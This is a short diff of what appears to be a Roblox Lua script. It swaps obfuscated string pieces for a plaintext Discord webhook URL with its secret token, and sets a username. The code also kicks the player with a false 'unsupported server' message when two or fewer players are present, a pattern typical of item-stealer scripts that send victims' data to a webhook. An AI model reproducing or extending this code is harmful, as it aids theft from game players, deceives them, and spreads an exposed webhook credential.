@@ -808,8 +808,8 @@ local usr = "site"
 local nme = "test010"
 local boolw = true
 if boolw == true then
-webHook = "\"" .. pl .. fe .. mf .. qpd .. bas .. pal .. rbs .. qlj .. anw .. qno .. qnf .. gin .. "\""
-userName = "\"" .. usr .. nme .. "\""
+webHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
+userName = "sitetest010"
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
